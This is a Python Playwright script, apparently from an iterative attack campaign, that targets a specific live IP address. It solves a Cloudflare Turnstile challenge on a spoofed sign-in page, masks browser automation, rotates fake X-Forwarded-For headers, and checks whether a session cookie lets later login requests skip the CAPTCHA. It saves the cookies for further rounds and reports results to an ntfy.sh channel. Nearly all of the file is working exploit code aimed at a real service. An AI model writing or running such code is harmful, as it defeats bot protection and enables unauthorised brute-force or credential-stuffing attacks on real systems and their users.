#!/usr/bin/env python3
"""i75513: bare-IP origin Turnstile solve for .37 + turnstile-bypass session cookie check.

Recipe derived from i74614 (working WARP + shadow-DOM click solver).
TARGET = http://135.148.204.37 (bare IP origin; control http://40.160.6.9:4100)
SITEKEY auto-extracted from /api/status (expect 0x4AAAAAAGDEObVt9sc3zTw_).

Bypass logic:
  1) solve turnstile token on the bare-IP origin (real browser + WARP egress)
  2) POST /api/user/login?turnstile=<tok> with PLACEHOLDER creds (1-2 times, XFF rotate)
     -> Turnstile middleware calls session.Set("turnstile", true) and returns a Set-Cookie
  3) POST /api/user/login WITHOUT token but WITH that cookie (1 time, XFF rotate)
     -> if body is NOT "Turnstile token 为空" (e.g. "用户名或密码错误") => bypass works.
  4) dump cookies to results json + cookies_<host>.json for the next round.
"""
import json, os, sys, time, re, random
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright

TARGETS = [t.strip() for t in os.environ.get(
    "TARGETS", os.environ.get("TARGET", "http://135.148.204.37")).split(",") if t.strip()]
SITEKEY_ENV = os.environ.get("SITEKEY", "0x4AAAAAAGDEObVt9sc3zTw_")
PROXY = os.environ.get("PROXY", "")
BUDGET = int(os.environ.get("BUDGET", "240"))
NT = os.environ.get("NT", "")
PLACE_USER = os.environ.get("PLACE_USER", "zz_probe_nouser")
PLACE_PASS = os.environ.get("PLACE_PASS", "Zz_probe_pass_1")

TARGET = TARGETS[0]
HOST = urlparse(TARGET).hostname
SITEKEY = SITEKEY_ENV
MINI = ""

MINI_TMPL = """<!doctype html><html><head><meta charset="utf-8"><title>Sign In</title>
<style>body{font-family:system-ui;margin:40px}#c{margin-top:10px;width:320px;height:80px}</style></head>
<body><h1>Sign In</h1><div id="c"></div>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=cb_onload"></script>
<script>
window.__tok=""; window.__err=""; window.__log=[];
function mk(wid, opts){
  var o = {sitekey:"%s", theme:"light", size:"normal",
    callback:function(t){window.__tok=t; document.title="TOK:"+t.length; window.__log.push("cb:"+t.length+":"+wid);},
    "error-callback":function(e){window.__err="cb:"+e; window.__log.push("err:"+e+":"+wid);},
    "expired-callback":function(){window.__log.push("expired:"+wid);},
    "timeout-callback":function(){window.__err="timeout"; window.__log.push("timeout:"+wid);}};
  for(var k in opts) o[k]=opts[k];
  try { var w = turnstile.render(wid, o); window.__log.push("rendered:"+w); return w; }
  catch(e){ window.__log.push("render:"+e); return null; }
}
function cb_onload(){
  window.__log.push("onload");
  window.__wid = mk("#c", {});
}
</script></body></html>"""


def build_mini(sk):
    return MINI_TMPL % sk


def log(*a):
    print("[p]", *a, flush=True)


def ntfy(msg):
    if not NT:
        return
    try:
        import urllib.request
        urllib.request.urlopen(urllib.request.Request(
            "https://ntfy.sh/%s" % NT, data=msg.encode()[:3500],
            headers={"Title": "i75513"}), timeout=10)
    except Exception as e:
        log("ntfy err", str(e)[:80])


READ_JS = """() => {
    let t = '';
    try { t = window.__tok || ''; } catch(e){}
    if (!t && window.turnstile) {
        try { t = window.turnstile.getResponse ? (window.turnstile.getResponse(window.__wid) || '') : ''; } catch(e){}
    }
    const out = {tok: t, url: location.href, title: document.title, log: []};
    try { out.log = (window.__log||[]).slice(-14); } catch(e){}
    try {
      var host = document.querySelector('#c > div > div') || document.querySelector('#c > div');
      out.host = host ? host.tagName : null;
      out.shadow = !!(host && host.shadowRoot);
      out.cRect = (function(){var r=document.querySelector('#c').getBoundingClientRect();
                    return {x:r.x,y:r.y,w:r.width,h:r.height};})();
      out.iframes = [];
      document.querySelectorAll('iframe').forEach(function(f,i){
        out.iframes.push({i:i, src:(f.src||'').slice(0,120), w:f.clientWidth, h:f.clientHeight});
      });
    } catch(e){ out.derr = ''+e; }
    return out;
}"""


def http_client(extra=None):
    import httpx
    kw = dict(timeout=40.0, verify=False, follow_redirects=True,
              headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
                       "Accept": "application/json", "Content-Type": "application/json"})
    if PROXY:
        kw["proxy"] = PROXY
    if extra:
        kw["headers"].update(extra)
    return httpx.Client(**kw)


def fetch_status(target):
    out = {}
    try:
        with http_client() as c:
            r = c.get(target + "/api/status")
            out = {"status": r.status_code, "len": len(r.content), "body": r.text[:2500]}
    except Exception as e:
        out = {"err": str(e)[:200]}
    return out


def pick_sitekey(status_obj):
    body = status_obj.get("body", "") if isinstance(status_obj, dict) else ""
    m = re.search(r"0x4AAAAA[A-Za-z0-9_-]{8,}", body)
    if m:
        return m.group(0)
    return SITEKEY_ENV


def connectivity_timeline(target, n=1, gap=4):
    import httpx
    out = []
    with http_client() as c:
        for i in range(n):
            row = {"i": i, "ts": time.strftime("%H:%M:%S")}
            for name, url in (("target", target + "/api/status"),
                              ("brunhild_path", "https://brunhild.challenges.cloudflare.com/cdn-cgi/challenge-platform/")):
                t0 = time.time()
                try:
                    r = c.get(url)
                    row[name] = {"status": r.status_code, "len": len(r.content),
                                 "elapsed": round(time.time() - t0, 2)}
                except Exception as e:
                    row[name] = {"err": str(e)[:100], "elapsed": round(time.time() - t0, 2)}
            log("CONN", json.dumps(row)[:300])
            out.append(row)
            if i < n - 1:
                time.sleep(gap)
    return out


def solve_once(p, results):
    args = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
            "--disable-blink-features=AutomationControlled",
            "--disable-features=HttpsUpgrades,HttpsFirstBalancedModeAutoEnable,HttpsFirstModeV2",
            "--lang=en-US", "--window-size=1280,900"]
    kw = dict(channel="chrome", headless=False, args=args)
    if PROXY:
        kw["proxy"] = {"server": PROXY}
    browser = p.chromium.launch(**kw)
    ctx = browser.new_context(locale="en-US", timezone_id="America/New_York",
                              viewport={"width": 1280, "height": 900}, ignore_https_errors=True)
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
    page = ctx.new_page()
    console, responses, reqfail = [], [], []
    page.on("console", lambda m: console.append({"type": m.type, "text": m.text[:250]}) if len(console) < 300 else None)

    def on_response(r):
        try:
            u = r.url
            if "cloudflare.com" in u and ("/fo/" in u or "/ci/" in u or "turnstile/f/" in u) and len(responses) < 60:
                body = ""
                try:
                    body = r.text()[:300]
                except Exception:
                    pass
                responses.append({"url": u[:150], "status": r.status, "body": body})
        except Exception:
            pass
    page.on("response", on_response)
    page.on("requestfailed", lambda r: reqfail.append("%s %s" % (r.url[:100], r.failure)) if len(reqfail) < 30 else None)

    def route(r):
        h = urlparse(r.request.url).hostname or ""
        if h == HOST:
            if r.request.resource_type == "document":
                r.fulfill(status=200, content_type="text/html; charset=utf-8", body=MINI)
            else:
                r.continue_()
        elif "cloudflare.com" in h:
            r.continue_()
        else:
            r.abort()

    page.route("**/*", route)
    t0 = time.time()
    try:
        page.goto(TARGET + "/sign-in", wait_until="commit", timeout=60000)
    except Exception as e:
        log("goto err", str(e)[:120])

    snaps, tok, clicks = [], "", []
    deadline = time.time() + BUDGET
    last_snap = last_click = 0
    phase = 1
    while time.time() < deadline:
        st = None
        try:
            st = page.evaluate(READ_JS)
        except Exception as e:
            log("eval err", str(e)[:80])
        if st:
            tok = st.get("tok") or ""
            if tok:
                snaps.append({"t": round(time.time() - t0, 1), "tok_len": len(tok)})
                break
            if time.time() - last_snap >= 12:
                last_snap = time.time()
                snaps.append({"t": round(time.time() - t0, 1), "state": st})
                log("SNAP", json.dumps(st)[:900])
        if time.time() - t0 > 5 and time.time() - last_click > 7 and len(clicks) < 10:
            try:
                r = page.evaluate("() => {var r=document.querySelector('#c').getBoundingClientRect();return {x:r.x,y:r.y,w:r.width,h:r.height};}")
                if r and r.get("w", 0) > 4:
                    for dx in (28, 150):
                        page.mouse.move(r["x"] + dx, r["y"] + r["h"] / 2)
                        page.mouse.down(); time.sleep(0.08); page.mouse.up()
                        time.sleep(0.35)
                    clicks.append({"t": round(time.time() - t0, 1), "rect": r})
                    last_click = time.time()
                    log("CLICK", json.dumps(clicks[-1]))
                    try:
                        page.screenshot(path="shot_%d.png" % len(clicks))
                    except Exception:
                        pass
            except Exception as e:
                log("click err", str(e)[:90])
        if phase == 1 and time.time() - t0 > 80 and not tok:
            phase = 2
            try:
                page.evaluate("""() => {
                    try { var d=document.createElement('div'); d.id='c2'; d.style.marginTop='20px';
                          document.body.appendChild(d);
                          if(window.turnstile && window.__wid){ try{turnstile.remove(window.__wid);}catch(e){} }
                          window.__wid = mk('#c2', {appearance:'always'}); } catch(e){ window.__log.push('p2:'+e); }
                }""")
                log("PHASE2 fresh widget appearance=always")
            except Exception as e:
                log("phase2 err", str(e)[:90])
        time.sleep(1.2)

    info = {"token_len": len(tok), "page_url": page.url, "origin": TARGET, "sitekey": SITEKEY,
            "elapsed": round(time.time() - t0, 1), "clicks": clicks,
            "snapshots": snaps[-6:], "console": console[-40:],
            "cf_bodies": responses[-12:], "reqfail": reqfail[-10:]}
    try:
        info["err"] = page.evaluate("window.__err || ''")
        info["page_log"] = page.evaluate("window.__log || []")
    except Exception:
        pass
    results["solve"] = info
    results["token"] = tok
    log("SOLVE", json.dumps({k: v for k, v in info.items() if k != "snapshots"})[:2500])
    try:
        page.screenshot(path="last_probe_%s.png" % HOST.replace(".", "_").replace(":", "_"))
        open("last_probe_%s.html" % HOST.replace(".", "_").replace(":", "_"), "w").write(page.content())
    except Exception:
        pass
    return browser, ctx, page, tok


def rand_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))


def do_bypass(tok, results):
    c = http_client()
    out = {}
    try:
        # STEP 1: with token, placeholder creds -> middleware sets session turnstile=true
        xff = rand_ip()
        try:
            r1 = c.post(TARGET + "/api/user/login?turnstile=" + tok,
                        json={"username": PLACE_USER, "password": PLACE_PASS}, timeout=40,
                        headers={"X-Forwarded-For": xff, "X-Real-IP": xff})
            out["step1"] = {"status": r1.status_code, "body": r1.text[:900],
                            "set_cookie": r1.headers.get("set-cookie", "")[:600]}
        except Exception as e:
            out["step1"] = {"err": str(e)[:200]}
        out["cookies_after_step1"] = dict(c.cookies)
        log("STEP1", json.dumps(out["step1"])[:700])
        log("STEP1_COOKIES", json.dumps(out["cookies_after_step1"])[:500])
        time.sleep(4)
        # STEP 2: NO token, WITH cookie -> if not "Turnstile token 为空" then bypass works
        xff2 = rand_ip()
        try:
            r2 = c.post(TARGET + "/api/user/login",
                        json={"username": PLACE_USER, "password": PLACE_PASS}, timeout=40,
                        headers={"X-Forwarded-For": xff2, "X-Real-IP": xff2})
            out["step2"] = {"status": r2.status_code, "body": r2.text[:900],
                            "set_cookie": r2.headers.get("set-cookie", "")[:600]}
        except Exception as e:
            out["step2"] = {"err": str(e)[:200]}
        out["cookies_after_step2"] = dict(c.cookies)
        log("STEP2", json.dumps(out["step2"])[:700])
        log("STEP2_COOKIES", json.dumps(out["cookies_after_step2"])[:500])

        b2 = (out.get("step2") or {}).get("body", "")
        token_empty = ("Turnstile token 为空" in b2) or ("turnstile" in b2.lower() and ("为空" in b2 or "token" in b2.lower() and "空" in b2))
        # bypass success = step2 did NOT hit the turnstile-empty guard
        bypass = bool(b2) and ("Turnstile token 为空" not in b2)
        out["bypass_success"] = bypass
        out["step2_reached_cred_check"] = bypass
        results["bypass"] = out
        # persist cookies if we have any session cookie
        ck = out.get("cookies_after_step2") or out.get("cookies_after_step1") or {}
        if ck:
            safe = HOST.replace(".", "_").replace(":", "_")
            json.dump({"target": TARGET, "sitekey": SITEKEY, "bypass": bypass,
                       "cookies": ck, "step1": out.get("step1"), "step2": out.get("step2")},
                      open("cookies_%s.json" % safe, "w"), indent=1)
            log("COOKIES_SAVED", "cookies_%s.json" % safe)
    finally:
        try:
            c.close()
        except Exception:
            pass
    return out


def attempt(target, p):
    global TARGET, HOST, SITEKEY, MINI
    TARGET = target
    HOST = urlparse(target).hostname
    results = {"target": TARGET, "sitekey": SITEKEY_ENV, "ts": time.strftime("%F %T"),
               "proxy": PROXY, "budget": BUDGET, "v": "i75513"}
    st = fetch_status(TARGET)
    results["status"] = {"status": st.get("status"), "len": st.get("len"),
                         "snippet": (st.get("body") or st.get("err", ""))[:900]}
    log("STATUS", json.dumps(results["status"])[:600])
    SITEKEY = pick_sitekey(st)
    results["sitekey_used"] = SITEKEY
    MINI = build_mini(SITEKEY)
    results["conn_timeline"] = connectivity_timeline(TARGET, 1, 4)
    b = ctx = page = None
    tok = ""
    try:
        b, ctx, page, tok = solve_once(p, results)
        if tok:
            results["token_prefix"] = tok[:40] + "..."
            results["token_full"] = tok
            do_bypass(tok, results)
            bs = (results.get("bypass") or {}).get("bypass_success")
            ntfy("i75513 %s token_len=%d bypass=%s" % (TARGET, len(tok), bs))
        else:
            ntfy("i75513 NO_TOKEN %s clicked=%d err=%s" % (
                TARGET, len((results.get("solve") or {}).get("clicks") or []),
                (results.get("solve") or {}).get("err")))
    finally:
        try:
            if ctx:
                ctx.close()
            if b:
                b.close()
        except Exception:
            pass
    return results


def main():
    allres = {"targets": TARGETS, "ts": time.strftime("%F %T"), "v": "i75513", "proxy": PROXY}
    per = []
    with sync_playwright() as p:
        for t in TARGETS:
            log("=========== ATTEMPT", t)
            try:
                r = attempt(t, p)
            except Exception as e:
                log("attempt fatal", str(e)[:200])
                r = {"target": t, "fatal": str(e)[:300]}
            per.append(r)
    allres["attempts"] = per
    json.dump(allres, open("results_probe37.json", "w"), indent=1)
    print("RESULTS_JSON " + json.dumps({
        "targets": TARGETS,
        "per": [{"target": a.get("target"), "sitekey": a.get("sitekey_used"),
                 "token_len": (a.get("solve") or {}).get("token_len"),
                 "err": (a.get("solve") or {}).get("err"),
                 "bypass": (a.get("bypass") or {}).get("bypass_success"),
                 "step2": ((a.get("bypass") or {}).get("step2") or {}).get("body", "")[:200]}
                for a in per]
    })[:3000], flush=True)


if __name__ == "__main__":
    main()
